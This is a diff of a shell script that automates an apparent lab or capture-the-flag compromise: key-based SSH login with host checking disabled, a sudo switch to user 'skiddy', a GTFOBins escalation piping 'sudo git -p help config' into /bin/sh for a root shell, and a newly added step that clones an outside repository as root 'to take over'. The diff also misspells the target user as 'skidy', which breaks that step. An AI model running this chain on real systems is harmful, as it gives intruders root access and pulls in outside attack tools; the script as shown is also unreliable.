@@ -36,15 +36,10 @@ if ! ssh -i id_rsa -o StrictHostKeyChecking=no Ashu@"$ip_address"; then
 fi
 sleep 4
 # Check sudo privileges for user skiddy
-echo "Checking sudo privileges for user skiddy..."
-if ! sudo -l -U skiddy; then
-  echo "Failed to check sudo privileges for user skiddy."
-  exit 1
-fi
-sleep 4
+
 # Elevate to user skiddy shell
 echo "Elevating to user skiddy shell..."
-if ! sudo su -c "echo 'Elevated to user skiddy shell.'" skiddy; then
+if ! sudo su -c "echo 'Elevated to user skiddy shell.'" skidy; then
   echo "Failed to elevate to user skiddy shell."
   exit 1
 fi
@@ -62,5 +57,12 @@ if ! sudo git -p help config | /bin/sh; then
   echo "Failed to exploit GTFObins to gain root shell."
   exit 1
 fi
+
 sleep 4
+echo "Cloning tools to take over"
+if ! sudo git clone https://github.com/Le-Bullwhale/deploy.git; then
+echo "failed to deploy tools"
+exit 1
+fi 
+
 echo "Script execution completed."
